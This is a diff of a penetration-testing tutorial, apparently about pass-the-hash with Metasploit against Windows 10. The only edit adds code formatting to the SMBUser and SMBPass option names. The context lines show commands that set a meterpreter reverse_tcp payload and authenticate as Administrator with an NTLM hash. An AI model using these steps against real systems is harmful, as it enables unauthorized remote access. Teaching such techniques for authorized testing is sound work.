@@ -97,11 +97,11 @@ For this section, our target system will be running Windows 10. As a prerequisit
 
         set payload windows/x64/meterpreter/reverse_tcp
 
-1. You will also need to set the SMBPass and SMBUser options with the NTLM hash and name of the user account. This can be done by running the following commands:
+1. You will also need to set the `SMBPass` and `SMBUser` options with the NTLM hash and name of the user account. This can be done by running the following commands:
 
         set SMBUser <USERNAME>
 
-    Note: In this case, we will be setting the “SMBUser” option to “Administrator”.
+    Note: In this case, we will be setting the `SMBUser` option to “Administrator”.
 
         set SMBPass <NTLM Hash>
 
